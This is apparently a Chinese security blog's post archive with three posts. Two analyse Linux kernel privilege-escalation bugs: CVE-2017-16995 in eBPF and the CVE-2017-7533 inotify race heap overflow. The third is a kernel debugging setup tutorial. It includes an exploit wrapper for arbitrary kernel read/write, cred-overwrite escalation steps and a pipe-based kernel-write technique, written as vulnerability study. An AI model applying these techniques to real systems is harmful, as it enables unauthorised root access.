因为这个漏洞可以重复触发，所以只需要把上面的函数做一下封装，就可以组成一个任意读写的函数，通过控制op参数的值促使内核做不同的读写操作：op = 0：获取内核栈帧，addr=0，value=0，返回值为内核栈帧op = 1：获取skbuff的值，addr=0，value=0，返回值为skbuff的地址op = 2：执行读操作，addr：需要读的内核地址，返回值为读取的值op = 3：执行写操作，addr：需要写的内核地址，value：需要写的值12345678static unsigned longsendcmd(unsigned long op, unsigned long addr, unsigned long value) &#123; update_elem(0, op); /* 修改map元素1中的value为指定的op指令*/ update_elem(1, addr); /* 修改map元素2中的value为需要读/写的内核地址*/ update_elem(2, value); /* 修改map元素3中的value为需要写入的值*/ writemsg(); /* 触发bpf程序实际执行 */ return get_value(2); /* 获取map元素3中的value值 */&#125; 一般的提权套路都是先获取到task_struct结构体，然后再根据task_struct获取当前进程的cred结构体，这里有两种提权方案 泄漏内核栈帧（kernel sp），计算thread_info，得到task_struct结构体，接着遍历cred结构体，修改cred结构体1. kernel_sp = get_fp( ) &amp; ~(0x4000 - 1); 泄漏sk_buff，计算sock_add结构体地址，sock_add结构体中包含当前进程的cred结构体，修改cred结构体1. sk_buff-&gt;sk-&gt;sk_peer_cred &lt;&lt; cred结构体 小结：感觉这个漏洞蛮好玩的，第一次玩这种漏洞，好像叫什么Data-Oriented Attacks，通过传入精心构造的数据就可以控制程序的执行流程，让内核直接执行我们传入的代码，利用起来也特别稳定还非常好理解而且由于都是正常操作，所以直接绕过了内核对于漏洞利用的缓解机制，完全不像哪些容易造成系统崩溃的破坏内存的漏洞，还有就是bpf基址的内置VM指令解析感觉也很有趣，真不知道漏洞作者当时是怎么发现的。跟着exp分析了下该漏洞，并做一下记录，感觉自己还有很多地方需要学习，不断努力，多找一些exploit，跟着作者的思路一步一步的分析，思考作者当时的想法，不断积累漏洞利用经验。触发该漏洞需要两个条件： Kernel编译选项CONFIG_BPF_SYSCALL打开，启用了bpf syscall； /proc/sys/unprivileged_bpf_disabled设置为0，允许非特权用户调用bpf_syscall； 相关文章：BPF：https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.htmlBPF：http://prototype-kernel.readthedocs.io/en/latest/bpf/ebpf_maps.htmlhttp://www.cnblogs.com/rebeyond/p/8921307.htmlhttps://dangokyo.me/2018/05/24/analysis-on-cve-2017-16995/https://security.tencent.com/index.php/blog/msg/124https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html?m=1最初的exphttps://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.chttps://github.com/dangokyo/CVE_2017_16995https://github.com/rlarabee/exploits/tree/master/cve-2017-16995","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Linux_Kernel","slug":"Linux-Kernel","permalink":"http://github.com/tags/Linux-Kernel/"}]},{"title":"linux内核调试环境搭建","slug":"linux内核调试环境搭建","date":"2018-04-30T13:28:02.000Z","updated":"2018-08-26T10:39:39.806Z","comments":true,"path":"2018/04/30/linux内核调试环境搭建/","link":"","permalink":"http://github.com/2018/04/30/linux内核调试环境搭建/","excerpt":"","text":"linux内核调试环境搭建 内核下载首先因为我们要调试内核,所以需要自己编译内核先去https://www.kernel.org/,下载一个合适的内核源码包并解压出来，然后cd到该内核源码的根目录下。 内核编译配置.config文件通过执行make menuconfig命令生成.config配置文件可能会出现以下的错误,这是因为最小系统不支持图形的原因,安装libncurses5-dev后即可 解决方法： 下载libncurses5源码包,编译,安装,相对比较麻烦 sudo apt-get update(更新系统源) sudo apt-get install libncurs*(安装依赖文件) make menuconfig命令执行成功,可以看到成功弹出了配置勾选界面勾选以下选项:不同内核版本选项的位置可能会不同勾选以下选项：取消以下选项：取消该选项后就可以在内核地址上就行写操作了,如果该选项被选中的话,那么gdb将无法下断点!(提示:invalid address错误) 快捷键： y勾选,n取消勾选, enter进入子菜单界面 按两次esc回退到父菜单界面 编译参数设置完毕，保存完成后会生成一个.config文件，保存在内核源码跟目录下，系统会依据该配置文件来生成内核镜像 生成bzImage文件 make -j8 make命令包含下列的命令: 1. 确定依赖项：make dep 2. 清理编译之间文件：make clean 3. 编译内核生成bzImage文件：make bzImage 4. 编译模块生成模块文件：make module make命令执行完毕后就会生成一个bzImage文件和一个vmlinux文件 - bzImage就是内核镜像 - vmlinux就是gdb源码调试所需的文件 把这两个文件拷贝到一个空目录,方便管理 生成initrd.img文件 make module_install //该命令会在/lib/modules/ 目录下生成制作initrd.img所需的文件 3.18.47是上面的命令生成的文件夹 4.4.0-31-generic是本机原始内核的(不用关注) 使用以下命令生成initrd.img文件 mkinitramfs /lib/modules/3.18.47 -o ./initrd.img该命令会在当前目录下生成initrd.img文件,生成完毕后把它拷贝到内核镜像同一个目录下 如果一切顺利的话，我们有了以下几个文件，现在就可以进行下一步了 方案1：qemu调试qemu安装通过apt-get即可安装，也可以到官网去下载源码进行安装:https://www.qemu.org/download/apt-get install qemu qemu启动内核因为我们编译的是64位的内核,使用我们使用qemu-system-x86_64对内核进行启动启动命令：qemu-system-x86_64 -kernel ./bzImage -initrd ./initrd.img -smp 2 -gdb tcp::1234 -S -kernel：自定义内核的路径 -initrd：initrd.img的路径 -smp：cpu核数 -gdb tcp:1234：启动qemu内置的gdbserver,开启gdb调试端口 -S：挂起,等待gdb服务端连接调试注意命令中文件路径 gdb连接调试使用gdb载入编译内核时生成的vmlinux达到源码调试gdb [路径]/vmlinux //载入内核对应的vmlinux文件 载入vmlinux成功后,通过target remote localhost:1234就可以连接上qemu中被挂起的linux,达到内核调试的效果不过我这gdb存在问题，在网上找的解决方法说需要修改gdb源码，试了下也没解决，不过别的小伙伴却可以，可能是系统环境的原因吧 方案2：双机调试更新本机内核我们把内核和所需模块编译好之后通过下面的命令安装到本机make modules_install //安装编译出来的modules到本机make install //安装编译出来的内核到本机 命令执行完毕后可以看到/boot目录下新生成了几个文件，内核更新到了我们编译的版本，说明我们内核编译成功了关机重启，验证一下，虚拟机再启动是通过按住ESC键就可进入grub选项enter进入，可以看到当前系统安装的内核，我们选择新安装的内核3.18.47启动发现启动起来了只有一个小黑窗，这并不是我想要的，不过可以看到内核确实是更新成功了遇到这种问题，可能因为本机是4.x的，而新编译的是3.x的不兼容，不能直接进入图形界面吧，然后又在官网上找了一个4.4.1的内核，下载下来编译通过，安装内核到本机，再次启动看能否进入图形界面。进入grub，选择4.4.1的内核启动（好像linux自己会选择最新的内核版本启动）还好还好，终于是进来了，继续入坑验证成功后，关闭虚拟机 配置双机通信因为我们使用双机调试，需要一个客户机和一个目标机，因为在WMware中搭建，所以可以直接克隆一份当前的环境用作目标机，这里我选择的是完全克隆，链接克隆没试过然后给两台机器配置通信，这里采用串口通信，需要注意的是，在安装虚拟机的时候会默认安装时并口，但是没有串口，所以我们需要先将并口删除（在虚拟机设置中移除打印机），然后添加串口，并按照图中显示配置串口客户机:目标机:这里需要注意的是客户技设置的是该端为客户端,而目标机设置的是该端为服务端 验证通信两台机器的串口端口配置完毕后就来验证一下是否能够通信吧让他们都飞起来吧，启动完毕后在一段向串口输入数据，另一端接收数据。接收端(在这过程中接收数据端需要先打开接收，然后再让发送端发送):发送端:验证成功，能够正常通信 配置串口调试上面的配置完成之后，就相当于在两台虚拟机之间连了一根串口线，如果想让两个系统之间通过出口线调试，那么还需要配置串口调试模式 客户机调试配置通过gedit /etc/default/grub打开文件，搜索关键字，备份一下，修改内容修改完毕后，通过update-grub命令更新grub，让配置生效这样grub就完成了更新,重启设备后就会加载串口通信，grub更新配置后,会自动修改/boot/grub/grub.cfg文件 目标机调试配置目标机也是修改相同的文件，不过这里多了一个参数”text”，这个参数的意思是系统启动后以text界面启动，而不是以图形界面显示（这个不是必须的，看个人吧）修改完毕后更新grub:update-grub，更新完毕后我们需要手动修改/boot/grub/grub.cfg文件，添加等待调试的启动选项通过复制一份启动选项,把”Ubuntu, with Linux 4.4.1”修改为”Ubuntu, with Linux 4.4.1—wait”,并且在新添加的启动选项中再添加一个kgdbwait选项(为了在系统刚启动时可以进入调试模式) gdb连接调试配置设置完成，启动验证选中启动，目标机进行等待状态可以看到目标机已经进入等待远程调试状态,此时我们在客户端使用gdb调试器连接试试gdb连接成功了当系统启动后可以使用以下命令让系统进入调试模式,让gdb再次附加,下断调试echo g &gt; /proc/sysrq-trigger //进入调试模式b start_kernel //在内核开始处下断 总结搭建环境就是麻烦，遇到各种奇怪的问题，可气的的是同样的方式搭建别人可以，我这就出错，应该是环境的问题吧。不管怎么说，至少最后能调试了。qemu调试：感觉这种调试方法挺方便的，可惜我gdb总是出现问题，唉双机调试：使用双机调试的话 如果我想换一个linux内核那是不是还得重新编译内核和更新虚拟机和串口配置，比较繁琐。","categories":[{"name":"Linux","slug":"Linux","permalink":"http://github.com/categories/Linux/"}],"tags":[{"name":"Tools","slug":"Tools","permalink":"http://github.com/tags/Tools/"}]},{"title":"CVE-2017-7533","slug":"CVE-2017-7533","date":"2018-03-25T11:19:17.000Z","updated":"2019-03-30T10:08:20.125Z","comments":true,"path":"2018/03/25/CVE-2017-7533/","link":"","permalink":"http://github.com/2018/03/25/CVE-2017-7533/","excerpt":"","text":"CVE-2017-7533 前言漏洞信息 实验环境：Pixel XL [google/marlin/marlin:7.1.1/NMF26U/3562008:user/release-keys] 漏洞类型：条件竞争–&gt;堆溢出，申请堆时使用的字符串长度通过条件竞争改变，导致拷贝时堆内存不够，破坏slab数据 Linux补丁链接：https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=49d31c2f389acfe83417083e1208422b4091cd9e Android补丁链接：无(披露信息:https://source.android.com/security/bulletin/2017-12-01) 漏洞成因：http://seclists.org/oss-sec/2017/q3/240 相关信息：Linux_kernel &lt;= 4.12.4版本,fsnotify实现中存在竞争条件漏洞，发生在inotify_handle_event( )和vfs_rename( )函数之间,因为内核通过这两个函数对同一个文件同时做重命名操作和打开操作时并没有加锁,所以会存在条件竞争漏洞,会导致释放后重引用和堆溢出漏洞。如果本地用户通过构造恶意的数据,可用作本地权限提升和造成拒绝服务。 漏洞验证https://github.com/hardenedlinux/offensive_poc/blob/master/CVE-2017-7533/exploit.c 背景知识首先了解下漏洞涉及到的Inotify机制(文件系统变化通知机制)。为了更好的管理设备，给用户提供更好的服务，如hotplug，udev和inotify就是这类需求催生的，Hotplug是一种内核想用户态应用通报关于热插拔设备事件发生的机制，udev动态维护/dev下的设备文件，inotify是一种文件系统变化通知机制，如文件增加、删除、重命名等事件可以立刻让用户态获得。Inotify API用于检测文件系统变化的机制，可用于检测单个文件，也可以用于检测整个目录，该机制出现的目的是当内核空间发生某种事件之后，可以立即通知用户空间，方便用户做出具体的操作，该漏洞就出现在inotify机制相关的函数中。Inotify即可以监视文件，也可以监视目录Inotify使用系统调用而非SIGIO来通知文件系统时间Inotify使用文件描述符作为接口，因而可以使用通常的I/O操作select和poll来监视文件系统的变化。用户层接口: inotify_init（void）：用于创建一个inotify的实例，返回inotify事件队列的文件描述符 inotify_add_watch（int fd，const char* pathname，uint32_t mask）：用于添加”watch list（检测列表）”，成功返回一个unique的watch描述符 inotify_rm_watch（int fd，int wd）：用于从watch list中移除检测的对象可以通过read函数获取监听到的事件: size_t len = read (fd, buf, BUF_LEN); :fd指向inotify实例的文件描述符数据结构123456789101112struct inotify_event &#123; int wd; /* Watch descriptor */ uint32_t mask; /* Mask of events */ uint32_t cookie; /* Unique cookie associating related events (for rename(2)) */ uint32_t len; /* Size of name field */ char name[]; /* Optional null-terminated name */&#125;;.wd : 检测对象的watch descriptor.mask : 检测事件的mask.cookie : 和rename事件相关.len : name字段的长度.name : 检测对象的name 1234567struct inotify_event_info &#123; struct fsnotify_event fse; int wd; u32 sync_cookie; int name_len; char name[];&#125;; 12345678910111213141516Inotify 可以监视的文件系统事件包括：- IN_ACCESS，即文件被访问- IN_MODIFY，文件被 write- IN_ATTRIB，文件属性被修改，如 chmod、chown、touch 等- IN_CLOSE_WRITE，可写文件被 close- IN_CLOSE_NOWRITE，不可写文件被 close- IN_OPEN，文件被 open- IN_MOVED_FROM，文件被移走,如 mv- IN_MOVED_TO，文件被移来，如 mv、cp- IN_CREATE，创建新文件- IN_DELETE，文件被删除，如 rm- IN_DELETE_SELF，自删除，即一个可执行文件在执行时删除自己- IN_MOVE_SELF，自移动，即一个可执行文件在执行时移动自己- IN_UNMOUNT，宿主文件系统被 umount- IN_CLOSE，文件被关闭，等同于(IN_CLOSE_WRITE | IN_CLOSE_NOWRITE)- IN_MOVE，文件被移动，等同于(IN_MOVED_FROM | IN_MOVED_TO) 漏洞成因:相关函数缓冲区溢出链:open -&gt; SyS_open -&gt; do_sys_open -&gt; fsnotify_open -&gt; fsnotify_parent -&gt; __fsnotify_parent -&gt; fsnotify -&gt; send_to_group -&gt; inotify_handle_event来看看inotify机制中的一个堆溢出漏洞，当监控文件被打开时会调用到下面这个函数Heap-Overflow:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657int inotify_handle_event(struct fsnotify_group *group, struct inode *inode, struct fsnotify_mark *inode_mark, struct fsnotify_mark *vfsmount_mark, u32 mask, void *data, int data_type, const unsigned char *file_name, u32 cookie)&#123; struct inotify_inode_mark *i_mark; struct inotify_event_info *event; struct fsnotify_event *fsn_event; int ret; int len = 0; int alloc_len = sizeof(struct inotify_event_info); /* 计算inotify_event_info结构体大小 */ BUG_ON(vfsmount_mark); if ((inode_mark-&gt;mask &amp; FS_EXCL_UNLINK) &amp;&amp; (data_type == FSNOTIFY_EVENT_PATH)) &#123; struct path *path = data; if (d_unlinked(path-&gt;dentry)) return 0; &#125; if (file_name) &#123; len = strlen(file_name); /* 如果文件名为真,则计算文件名长度 */ alloc_len += len + 1; &#125; pr_debug(\"%s: group=%p inode=%p mask=%x\\n\", __func__, group, inode, mask); i_mark = container_of(inode_mark, struct inotify_inode_mark, fsn_mark); event = kmalloc(alloc_len, GFP_KERNEL); /* 分配内存大小等于 sizeof(inotify_event_info) + sizeof(file_name) */ if (unlikely(!event)) return -ENOMEM; fsn_event = &amp;event-&gt;fse; fsnotify_init_event(fsn_event, inode, mask); event-&gt;wd = i_mark-&gt;wd; event-&gt;sync_cookie = cookie; event-&gt;name_len = len; if (len) strcpy(event-&gt;name, file_name); /* 溢出点 把file_name拷贝到之前分配的内存中 */ ret = fsnotify_add_event(group, fsn_event, inotify_merge); if (ret) &#123; /* Our event wasn't used in the end. Free it. */ fsnotify_destroy_event(group, fsn_event); &#125; if (inode_mark-&gt;mask &amp; IN_ONESHOT) fsnotify_destroy_mark(inode_mark, group); return 0;&#125;溢出结构体struct inotify_event_info &#123; struct fsnotify_event fse; int wd; u32 sync_cookie; int name_len; char name[]; /* 拷贝时存在溢出 */&#125;; 我们来看看这个函数，首先计算inotify_event_info结构体的大小，然后计算目标文件名的长度，通过前面计算的值使用kmalloc分配出来一块内存，如果file_name的长度不为0，那么就使用strcpy函数把file_name拷贝到event-&gt;name处，也就是之前通过计算file_name长度申请的内存中。问题就出在这个函数中，仔细看会发现这里存在一个堆溢出漏洞(HeapOverflow)，实际上这个HeapOverflow是因为竞争条件(Race-condition)产生的。在访问file_name资源时未做加锁操作，存在一种情况是第一次计算长度时的file_name与第二次strcpt拷贝时的file_name内容不一致，因为strcpy的目标内存是通过计算第一次file_name的长度申请的内存，并且使用的还是strcpy不安全的拷贝函数，所以如果第二次的file_name内容的长度大于第一次计算的长度，那么这里就存在一个堆溢出漏洞。这种情况很好触发的，只需要再开启一个线程，当线程A执行完strlen(file_name)和kmalloc(alloc_len, GFP_KERNEL)操作后，线程B去修改file_name的内容，当线程A再返回去执行strcpy时就会出现前面说到的堆溢出情况。Race-condition:常见的竞争条件漏洞分为两种:第1种属于time-of-check-to-time-of-use漏洞,程序先检查对象的某个特征,后续的动作是假设这些特征一直保持的情况下作出的,但是这时的特征可能已经不具备了,导致信息不同步问题。第2种是因为程序的编写者考虑不周全,操作某些关键数据时未对数据做多线程/进程保护,导致多线程/进程访问同一资源时产生资源未及时更新的问题,可以通过这个冲突来对系统进行攻击。避免出现竞争条件可以通过对关键数据做加锁操作。竞争条件漏洞模式及其检测 条件竞争模式:具备的条件: 存在两个(或两个以上)时间发生,两个事件存在一定的间隔时间,两个事件存在一定的关系,即第二个事件(及其后的事件)依赖于第一个事件。 攻击者能够改变第一个事件所产生的,为第二个事件所依赖的假设。两事件之间是否存在间隔称为”编程条件”,间隔本身称为”编程间隔”,攻击者不但要发现这个间隔,还需要能够影响由第一个事件所产生的假设,这一条件称为”环境条件”。 该漏洞分为长文件名与短文件名两种溢出方式 长文件名使用kmalloc_256溢出 短文件名使用kmalloc_64溢出,不过现在的Android手机貌似已经去除了kmalloc_64分配要理解这两种溢出方式我们需要先来看看内核是如何存储溢出字符串的 1234567891011121314151617181920212223242526272829struct dentry &#123; /* RCU lookup touched fields */ unsigned int d_flags; /* protected by d_lock */ seqcount_t d_seq; /* per dentry seqlock */ struct hlist_bl_node d_hash; /* lookup hash list */ struct dentry *d_parent; /* parent directory */ /* 父目录的目录项对象 */ struct qstr d_name; /* qstr结构体中的name元素指向真正的文件名字符串 */ struct inode *d_inode; /* Where the name belongs to - NULL is * negative */ unsigned char d_iname[DNAME_INLINE_LEN]; /* small names */ /* 文件名长度&lt;32时会使用该数组存放文件名 */ /* Ref lookup also touches following */ struct lockref d_lockref; /* per-dentry lock and refcount */ const struct dentry_operations *d_op; struct super_block *d_sb; /* The root of the dentry tree */ unsigned long d_time; /* used by d_revalidate */ void *d_fsdata; /* fs-specific data */ struct list_head d_lru; /* LRU list */ struct list_head d_child; /* child of parent list */ struct list_head d_subdirs; /* our children */ /* * d_alias and d_rcu can share memory */ union &#123; struct hlist_node d_alias; /* inode alias list */ struct rcu_head d_rcu; &#125; d_u;&#125;; dentry(directory entry):目录项进程每次open一个文件，就会有一个file对象与之对应，同一个文件可以打开多次从而得到不同的file对象，file对象描述了被打开文件的属性，读写的偏移指针等信息。不同的file对象可以对应同一个dentry结构。dentry结构体保存则目录项和对应的文件inode信息。inode中不存储文件名字，只存储节点号，而dentry则保存文件名和预期对应的节点号，所以可以通过不同的dentry访问同一个inode。再来看一下dentry结构体是怎么分配的内存申请链:rename -&gt; sys_renameat2 -&gt; lookup_hash -&gt; __lookup_hash -&gt; lookup_dcache -&gt; d_alloc -&gt; __d_alloc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960struct dentry *__d_alloc(struct super_block *sb, const struct qstr *name)&#123; struct dentry *dentry; char *dname; dentry = kmem_cache_alloc(dentry_cache, GFP_KERNEL);/* 创建一个dentry结构体 */ if (!dentry) return NULL; dentry-&gt;d_iname[DNAME_INLINE_LEN-1] = 0; /* d_iname数组末尾填上0结尾 */ if (name-&gt;len &gt; DNAME_INLINE_LEN-1) &#123; /* 判断文件名的长度是否大于d_iname数组的大小 DNAME_INLINE_LEN == 32 */ size_t size = offsetof(struct external_name, name[1]); /* 进入文件名长度 &gt; 32的处理流程 */ struct external_name *p = kmalloc(size + name-&gt;len, GFP_KERNEL);/* 分配内存 大小等于external_name结构体大小 + 字符串长度 */ if (!p) &#123; kmem_cache_free(dentry_cache, dentry); return NULL; &#125; atomic_set(&amp;p-&gt;u.count, 1); /* external_name结构体的u.count元素为引用计数 并设置为1 */ dname = p-&gt;name; /* 让dname指针指向external_name结构体的name元素 */ if (IS_ENABLED(CONFIG_DCACHE_WORD_ACCESS)) kasan_unpoison_shadow(dname, round_up(name-&gt;len + 1, sizeof(unsigned long))); &#125; else &#123; /* 如果文件名长度小于DNAME_INLINE_LEN(32个字符)那么直接让dname指向dentry结构体的d_iname数组元素 */ dname = dentry-&gt;d_iname; &#125; dentry-&gt;d_name.len = name-&gt;len; /* 初始化dentry结构体中代表文件名长度的元素 */ dentry-&gt;d_name.hash = name-&gt;hash; memcpy(dname, name-&gt;name, name-&gt;len); /* 把实际的文件名拷贝到dname指针指向的内存 如果文件名长度&lt;32就拷贝到dentry-&gt;d_iname,如果长度&gt;32就拷贝到external_name-&gt;name */ dname[name-&gt;len] = 0; /* 添加0字符结尾 */ /* Make sure we always see the terminating NUL character */ smp_wmb(); dentry-&gt;d_name.name = dname; /* 让dentry结构体的d_name.name元素指向dname的位置(实际文件名)*/ dentry-&gt;d_lockref.count = 1; dentry-&gt;d_flags = 0; spin_lock_init(&amp;dentry-&gt;d_lock); seqcount_init(&amp;dentry-&gt;d_seq); dentry-&gt;d_inode = NULL; dentry-&gt;d_parent = dentry; dentry-&gt;d_sb = sb; dentry-&gt;d_op = NULL; dentry-&gt;d_fsdata = NULL; INIT_HLIST_BL_NODE(&amp;dentry-&gt;d_hash); INIT_LIST_HEAD(&amp;dentry-&gt;d_lru); INIT_LIST_HEAD(&amp;dentry-&gt;d_subdirs); INIT_HLIST_NODE(&amp;dentry-&gt;d_u.d_alias); INIT_LIST_HEAD(&amp;dentry-&gt;d_child); d_set_d_op(dentry, dentry-&gt;d_sb-&gt;s_d_op); this_cpu_inc(nr_dentry); return dentry;&#125;struct external_name &#123; /* 如果文件名大于32,那么内核会创建一个该结构体用来存放新文件名 */ union &#123; atomic_t count; /* 引用计数 */ struct rcu_head head; &#125; u; unsigned char name[]; /* 文件名 */&#125;; 首先根据文件名的长度判断属于长文件还是短文件 如果大于32个字符就属于长文件，申请一片空间，申请的空间大小等于external_name结构体大小加文件名长度，分配成功后就把文件名拷贝到申请的内存中，其实这就相当于创建了一个external_name结构体，然后把文件名拷贝到external_name结构体后面。 如果小于等于32个字符那么就属于短文件，直接把文件名拷贝到dentry结构体变量的d_iname数组中。 不管是长文件还是短文件，最后都会把dentry结构体中的d_name.name指向最终存放文件名的位置，这就是文件名两种不同的存放方式。 再来看下rename时是如何把oldname改为newname的重命名链: rename -&gt; sys_renameat2 -&gt; vfs_rename -&gt; d_move -&gt; __d_move -&gt; copy_name123456SYSCALL_DEFINE2(rename, const char __user *, oldname, const char __user *, newname)&#123; return sys_renameat2(AT_FDCWD, oldname, AT_FDCWD, newname, 0);&#125;SYSCALL_DEFINE5(renameat2, int, olddfd, const char __user *, oldname, int, newdfd, const char __user *, newname, unsigned int, flags) Use-After-Free:123456789101112131415161718192021222324252627static void copy_name(struct dentry *dentry, struct dentry *target)&#123; struct external_name *old_name = NULL; if (unlikely(dname_external(dentry))) /* 判断old文件名是长文件名还是短文件名 */ old_name = external_name(dentry); /* 如果为长文件名,就备份一下old_name 后续做释放 */ if (unlikely(dname_external(target))) &#123; /* 判断新文件名长度是否大于32,大于32进入*/ atomic_inc(&amp;external_name(target)-&gt;u.count); /* 引用计数-1*/ dentry-&gt;d_name = target-&gt;d_name; /* 让旧文件名dentry的d_name元素直接指向新文件名dentry的d_name */ &#125; else &#123; memcpy(dentry-&gt;d_iname, target-&gt;d_name.name, /* 否则表示新文件名长度小于32,直接把newname拷贝到栈中的dentry-&gt;d_iname处 */ target-&gt;d_name.len + 1); dentry-&gt;d_name.name = dentry-&gt;d_iname; dentry-&gt;d_name.hash_len = target-&gt;d_name.hash_len; &#125; if (old_name &amp;&amp; likely(atomic_dec_and_test(&amp;old_name-&gt;u.count)))/* 如果老文件名长度&gt;64 并且结构体引用计数为0,那么就把老文件名做释放操作 */ kfree_rcu(old_name, u.head); /* old_name -&gt; UAF结构体 */&#125;static inline int dname_external(const struct dentry *dentry)&#123; return dentry-&gt;d_name.name != dentry-&gt;d_iname; /* 检查dentry的d_name.name 与 dentry-&gt;d_iname是否指向同一块内存 */&#125;static inline struct external_name *external_name(struct dentry *dentry) /* 获取文件名的位置 */&#123; return container_of(dentry-&gt;d_name.name, struct external_name, name[0]);&#125; 一样的，首先还是判断old文件属于长文件还是短文件。如果是短文件，直接把新文件名直接拷贝到旧dentry变量中的d_iname数组中,然后让旧dentry-&gt;d_name指向dentry-&gt;d_iname。如果是长文件名那么就把odl_name指针指向旧dentry-&gt;d_name指向的结构体方便后面释放时索引，然后把旧dentry-&gt;d_name指向新dentry-&gt;d_name,接着判断old_name结构体中的引用计数是否为0,如果为0那么就使用kfree_rcu释放掉old_name这个结构体。这里还存在一个UAF漏洞，因为这里被释放的old_name-&gt;name在inotify_handle_event函数中存在释放后重引用的情况，后面的漏洞利用会用到这个UAF漏洞。 触发模型漏洞利用利用思路随机地址写任意值 -&gt; 可控地址写任意值1.因为最终触发的是一个堆溢出，会对溢出对象后面的内存进行写数据操作，不过这里被写的地址是我们不可控的，因为我们不知道被溢出的那个event对象会被分配在内存的什么位置，如果想要在指定的地址上写任意值的话还需要做一些别的操作。 在对内存进行布局之前我们先来看看pipe subsystem中存在的一个TOCTTOU（time of check to time of user）检查时间到使用时间的问题，就是检查值的操作与使用值的操作之间存在间隔，可以在这间隔时间去修改检查后的值，这就会导致使用时的值实际上已经不是检查时的值了。这也属于竞争条件漏洞的一种，这和7533的竞争条件原理差不多。不过在pipe中的time of use是我们可控的。 通过readv和writev来控制检查/使用时间1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950static ssize_t do_readv_writev(int type, struct file *file, const struct iovec __user * uvector, unsigned long nr_segs, loff_t *pos)&#123; size_t tot_len; struct iovec iovstack[UIO_FASTIOV]; struct iovec *iov = iovstack; ssize_t ret; io_fn_t fn; iov_fn_t fnv; iter_fn_t iter_fn; ret = rw_copy_check_uvector(type, uvector, nr_segs, /* rw_copy_check_uvector对传入的用户层的iovec做校验，并拷贝到内核态 */ ARRAY_SIZE(iovstack), iovstack, &amp;iov); if (ret &lt;= 0) goto out; tot_len = ret; ret = rw_verify_area(type, file, pos, tot_len); if (ret &lt; 0) goto out; fnv = NULL; if (type == READ) &#123; /* read */ fn = file-&gt;f_op-&gt;read; fnv = file-&gt;f_op-&gt;aio_read; iter_fn = file-&gt;f_op-&gt;read_iter; &#125; else &#123; /* write */ fn = (io_fn_t)file-&gt;f_op-&gt;write; fnv = file-&gt;f_op-&gt;aio_write; iter_fn = file-&gt;f_op-&gt;write_iter; file_start_write(file); &#125; if (iter_fn) ret = do_iter_readv_writev(file, type, iov, nr_segs, tot_len, pos, iter_fn); else if (fnv) ret = do_sync_readv_writev(file, iov, nr_segs, tot_len, pos, fnv); else ret = do_loop_readv_writev(file, iov, nr_segs, pos, fn); if (type != READ) file_end_write(file);out: if (iov != iovstack) kfree(iov); if ((ret + (type == READ)) &gt; 0) &#123; if (type == READ) fsnotify_access(file); else fsnotify_modify(file); &#125; return ret;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455ssize_t rw_copy_check_uvector(int type, const struct iovec __user * uvector, unsigned long nr_segs, unsigned long fast_segs, struct iovec *fast_pointer, struct iovec **ret_pointer)&#123; unsigned long seg; ssize_t ret; struct iovec *iov = fast_pointer; if (nr_segs == 0) &#123; /* nr_segs表示iovec的个数 等于0就退出*/ ret = 0; goto out; &#125; if (nr_segs &gt; UIO_MAXIOV) &#123; /* nr_segs不能大于UIO_MAXIOV（1024） */ ret = -EINVAL; goto out; &#125; if (nr_segs &gt; fast_segs) &#123; /* 如果nr_segs 大于8(ARRAY_SIZE(iovstack)) 那么就重新申请内存进行存储,小于8就直接放在开始申请的栈中的数组里面 */ iov = kmalloc(nr_segs*sizeof(struct iovec), GFP_KERNEL); if (iov == NULL) &#123; ret = -ENOMEM; goto out; &#125; &#125; if (copy_from_user(iov, uvector, nr_segs*sizeof(*uvector))) &#123; /* 把应用层的数据拷贝新内核层中 */ ret = -EFAULT; goto out; &#125; ret = 0; for (seg = 0; seg &lt; nr_segs; seg++) &#123; /* 对iovec中的iov_base与iov_len做合法性检查，iov_base必须指向用户态且iov_len不存在溢出*/ void __user *buf = iov[seg].iov_base; ssize_t len = (ssize_t)iov[seg].iov_len; /* see if we we're about to use an invalid len or if * it's about to overflow ssize_t */ if (len &lt; 0) &#123; ret = -EINVAL; goto out; &#125; if (type &gt;= 0 &amp;&amp; unlikely(!access_ok(vrfy_dir(type), buf, len))) &#123; ret = -EFAULT; goto out; &#125; if (len &gt; MAX_RW_COUNT - ret) &#123; len = MAX_RW_COUNT - ret; iov[seg].iov_len = len; &#125; ret += len; &#125;out: *ret_pointer = iov; return ret;&#125; rw_copy_check_uvector函数主要是判断iovec的个数是否为零和是否大于1024，如果都不成立的话就使用copy_from_user函数把用户态的iovec数据拷贝到内核态的中，如果传入的iovec个数大于8个就使用kmalloc在内核态申请一片内存进行存放用户态的iovecarray数据，如果小于等于8个那么就直接使用内核栈存放iovec array数据，接着遍历判断每个iovec结构体中的iov_base是否属于用户态地址并且iov_len是否不会出现溢出。这里的检测就是前面说的TOCTTOU中的time of check操作。iovec array在内核中存放的样子 检查完毕后通过判断type来区分是readv还是writev，如果是readv函数调用进来的，会走到pipe_read函数中，pipe_read函数会检查iovec中的iov_base指向的地址是否可写，pipe写端是否有数据，如果此时写端没有数据该函数就进入到等待模式，等待witev对pipe进行写入，当我们在用户态调用writev对pipe进行写入的时候，pipe_read就会把我们写入到pipe中的数据写入对应的iov_base指向的地址中。这里就属于TOCTTOU中的time of use操作。因为写入时间通过用户态调用writev来触发的，所以写入的值和写入的时机都是我们可控的。 如果我们能够在第一次检查iov_base指向地址是否为用户态地址后把iov_base指向的地址改为内核地址，当在第二次检查时因为只检查了是否可写而没检查是否为用户态地址，所以后续pipe_read会直接把我们writev传入的值写入到iov_base指向的内核地址中，这就达到了一个内核地址写操作。 引用一下少仲大佬的流程图 结合前面的堆溢出漏洞，可以把需要写入的内核地址溢出到iov_base上，这样写入地址，写入值都由我们控制了，不过写入地址有一个限制，因为是strcpy函数导致的溢出，所以写入地址中不能带有0字符不然就会存在截断问题。 